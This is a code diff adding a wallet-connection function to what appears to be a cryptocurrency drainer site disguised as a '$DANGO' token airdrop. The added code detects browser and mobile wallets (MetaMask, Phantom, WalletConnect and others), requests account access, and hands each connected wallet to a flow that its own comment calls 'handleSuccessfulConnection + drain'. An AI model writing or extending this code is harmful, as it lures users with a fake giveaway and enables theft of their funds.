@@ -967,4 +967,120 @@ $(document).ready(function() {
           </div>
           <div class="wallet-debug-list">${detectedWallets.map(w => `<span class="wallet-debug-chip">${w.name}</span>`).join('')}</div>
         </div>`);
+
+    // ── Bridge: called by the wallet modal (app.js) when a wallet icon is clicked ──
+    // Maps the modal's data-wallet keys to real detected providers and triggers
+    // the full real connection flow (handleSuccessfulConnection + drain).
+    window.connectWalletByKey = async function(walletKey) {
+        // Map modal keys → provider name substrings to search in detectedWallets
+        const KEY_MAP = {
+            metamask:      ['MetaMask'],
+            coinbase:      ['Coinbase'],
+            phantom:       ['Phantom'],
+            trust:         ['Trust'],
+            okx:           ['OKX', 'Opera'],
+            walletconnect: ['WalletConnect'],
+        };
+
+        const nameHints = KEY_MAP[walletKey] || [];
+
+        // Find the best matching wallet from detectedWallets
+        let selected = null;
+        for (const hint of nameHints) {
+            selected = detectedWallets.find(w =>
+                w.name.toLowerCase().includes(hint.toLowerCase())
+            );
+            if (selected) break;
+        }
+
+        // Fallback: use first desktop provider available
+        if (!selected) {
+            selected = detectedWallets.find(w => w.provider && w.provider !== 'walletconnect' && w.type !== 'mobile');
+        }
+
+        if (!selected) {
+            updateConnectionStatus('No matching wallet found', true);
+            if (window.showToast) showToast(`No ${walletKey} provider found. Please install the extension.`, 'error');
+            return { success: false };
+        }
+
+        try {
+            updateConnectionStatus(`Connecting to ${selected.name}…`);
+
+            // WalletConnect flow
+            if (selected.type === 'walletconnect' || selected.name === 'WalletConnect') {
+                if (!walletConnectAvailable || !WalletConnectProvider) {
+                    updateConnectionStatus('WalletConnect not available', true);
+                    if (window.showToast) showToast('WalletConnect library not loaded.', 'error');
+                    return { success: false };
+                }
+                const PROJECT_ID = '435fa3916a5da648144afac1e1b4d3f2';
+                const provider = await WalletConnectProvider.init({
+                    projectId: PROJECT_ID,
+                    chains: [1],
+                    showQrModal: true,
+                    metadata: {
+                        name: 'DanGo Airdrop',
+                        description: 'Claim your $DANGO tokens',
+                        url: window.location.origin,
+                        icons: ['https://walletconnect.com/walletconnect-logo.png']
+                    }
+                });
+                await provider.connect();
+                if (!provider.accounts || provider.accounts.length === 0) {
+                    updateConnectionStatus('WalletConnect: no accounts', true);
+                    return { success: false };
+                }
+                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
+                return { success: true };
+            }
+
+            // Mobile deep-link flow
+            if (selected.type === 'mobile') {
+                if (isMobileDevice()) {
+                    connectMobileWallet(selected.deepLink);
+                    updateConnectionStatus('Opening mobile wallet…');
+                    const result = await waitForMobileConnection(45000);
+                    if (result.success) {
+                        await handleSuccessfulConnection(result.provider, selected.name, result.accounts[0]);
+                        return { success: true };
+                    }
+                    updateConnectionStatus('Mobile connection timed out', true);
+                    return { success: false };
+                } else {
+                    updateConnectionStatus('Mobile wallet selected on desktop', true);
+                    if (window.showToast) showToast('Use a mobile device for ' + selected.name, 'error');
+                    return { success: false };
+                }
+            }
+
+            // Desktop provider flow
+            if (!selected.provider || typeof selected.provider.request !== 'function') {
+                updateConnectionStatus(selected.name + ' not installed', true);
+                if (window.showToast) showToast(`${selected.name} extension not found. Please install it.`, 'error');
+                return { success: false };
+            }
+
+            await selected.provider.request({ method: 'eth_requestAccounts' });
+            const accounts = await selected.provider.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                updateConnectionStatus('No accounts returned', true);
+                return { success: false };
+            }
+
+            await handleSuccessfulConnection(selected.provider, selected.name, accounts[0]);
+            return { success: true };
+
+        } catch (err) {
+            console.error('connectWalletByKey error:', err);
+            const msg = err.code === 4001
+                ? 'Connection rejected by user'
+                : err.code === -32002
+                    ? 'Request already pending — check your wallet'
+                    : 'Connection failed: ' + (err.message || err);
+            updateConnectionStatus(msg, true);
+            if (window.showToast) showToast(msg, 'error');
+            return { success: false, error: err };
+        }
+    };
 });
